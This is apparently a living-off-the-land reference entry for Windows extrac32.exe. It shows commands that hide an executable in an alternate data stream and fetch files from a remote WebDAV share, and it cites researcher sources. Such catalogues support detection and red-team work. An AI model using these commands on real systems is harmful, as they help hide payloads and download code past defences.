## Extrac32.exe
* Functions: Add ADS, Download
```

extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.

extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe
Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.

extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
Copy the source file to the destination file and overwrite it.
```
   
* Resources:   
  * https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
  * https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
  * https://twitter.com/egre55/status/985994639202283520
   
* Full path:   
  * c:\windows\system32\extrac32.exe
  * c:\windows\sysWOW64\extrac32.exe
   
* Notes: Thanks to Oddvar Moe - @oddvarmoe, egre55 - @egre55  
   
